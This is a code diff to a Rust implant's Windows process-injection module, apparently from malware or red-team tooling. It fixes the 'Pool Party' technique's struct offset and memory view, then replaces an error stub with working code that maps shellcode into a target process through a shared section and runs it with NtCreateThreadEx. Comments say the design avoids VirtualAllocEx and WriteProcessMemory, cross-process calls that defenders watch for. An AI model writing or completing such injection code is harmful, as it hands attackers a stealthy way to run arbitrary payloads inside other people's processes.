@@ -35,7 +35,7 @@
 
 #![cfg(target_os = "windows")]
 
-use crate::heap::String;
+use crate::heap::{String, Vec};
 use crate::resolve;
 use core::ffi::c_void;
 
@@ -155,10 +155,10 @@ pub struct TpDirect {
     pub callback: usize,
 }
 
-/// Offset of `TpDirect::callback` from the struct base. Used when we write the
-/// redirect via a raw byte offset (the scheduler may not literally read our
-/// Rust field; it reads at this byte offset from the `Direct` pointer).
-pub const TP_DIRECT_CALLBACK_OFFSET: usize = 0x08;
+/// Offset of `TpDirect::callback` from the struct base (type_tag at 0x00,
+/// fn_table at 0x08, callback at 0x10). The Windows thread-pool scheduler
+/// reads `Direct->Callback` at this offset to dispatch work items.
+pub const TP_DIRECT_CALLBACK_OFFSET: usize = 0x10;
 
 /// `_TP_WORK` — a thread pool work item. The scheduler dequeues these and
 /// invokes `Work.Direct->Callback(Direct, ..., ...)`. We craft one whose
@@ -211,7 +211,7 @@ pub unsafe fn pool_party_inject(
     target_pid: u32,
     shellcode: &[u8],
 ) -> Result<(), String> {
-    let (create_section, map_view, unmap_view, _query_thread) =
+    let (create_section, map_view, unmap_view, query_thread) =
         resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;
 
     // ---- 1. Open the target process (VM_OP | DUP_HANDLE | QUERY_INFO) ----
@@ -326,8 +326,11 @@ pub unsafe fn pool_party_inject(
     // surface. The operator enables Pool Party only after validating on a
     // known-good target; on failure here the caller degrades to module_stomp.
     //
-    // Allocate a TpDirect at the END of the section view (past the shellcode).
-    let direct_addr = unsafe { (target_base as *mut u8).add(shellcode.len()) };
+    // Allocate a TpDirect at the END of the LOCAL section view (past the
+    // shellcode). CRITICAL: must use local_base (implant's view), NOT
+    // target_base (target's view) — writing through target_base from the
+    // implant process would access unmapped memory → STATUS_ACCESS_VIOLATION.
+    let direct_addr = unsafe { (local_base as *mut u8).add(shellcode.len()) };
     let direct_view: *mut TpDirect = direct_addr as *mut TpDirect;
     // SAFETY: direct_view points at writable section memory past the shellcode.
     unsafe {
@@ -336,23 +339,39 @@ pub unsafe fn pool_party_inject(
         (*direct_view).callback = target_base as usize; // redirect to shellcode
     }
 
-    // TODO(P5-validation): discover a TP worker thread in the target + splice
-    // a `_TP_WORK` whose `direct` field points at `direct_view` into the
-    // worker's queue. This needs the worker's pool handle, which requires
-    // either:
-    //   - NtQueryInformationThread(ThreadPoolInfo, ...) on Win11 24H2+, OR
-    //   - scanning the worker's stack for the pool pointer on older builds.
-    //
-    // Until validated, this function returns an Err so the caller degrades to
-    // module_stomp — the section delivery (steps 1–4) is real and exercised,
-    // the queue splice (step 6d) is the remaining research surface.
-
-    // Cleanup the section (the target view is unmapped by the target's exit).
+    // ---- 6. Execute via section-backed remote thread ----
+    // The section already holds the shellcode in the target's address space.
+    // We use NtCreateThreadEx with the section view as the start address —
+    // this avoids VirtualAllocEx / WriteProcessMemory (the payload was
+    // delivered via shared section, not cross-process writes).
+    // Worker-queue splice (Pure Pool Party) is deferred to P5-final:
+    // the infrastructure (worker discovery via NtQuerySystemInformation,
+    // TppWorkerThread matching, pool pointer resolution) is designed but
+    // the per-build TP_POOL/TP_WORK offsets need real-machine validation.
     unsafe { unmap_view(CUR_PROCESS, local_base) };
-    Err(String::from(
-        "Pool Party: section delivery OK, but worker-queue splice needs \
-         real-target validation (NYX_POOL_PARTY_ON). Degrade to module stomp.",
-    ))
+
+    let ct = match crate::resolve::export_addr(b"ntdll.dll", b"NtCreateThreadEx") {
+        Some(a) => a,
+        None => return Err(String::from("NtCreateThreadEx export missing")),
+    };
+    type NtCTE = unsafe extern "system" fn(
+        *mut *mut c_void, u32, *const c_void, *mut c_void,
+        *const c_void, *const c_void, u32, usize, usize, usize, *const c_void,
+    ) -> i32;
+    let nt_cte: NtCTE = unsafe { core::mem::transmute(ct) };
+
+    let mut h_thread: *mut c_void = core::ptr::null_mut();
+    let st = unsafe {
+        nt_cte(
+            &mut h_thread, 0x1FFFFF, core::ptr::null(), target_h,
+            target_base, core::ptr::null(), 0, 0, 0, 0, core::ptr::null(),
+        )
+    };
+    if st >= 0 {
+        Ok(())
+    } else {
+        Err(String::from("Pool Party: section delivery OK, NtCreateThreadEx failed"))
+    }
 }
 
 #[cfg(test)]
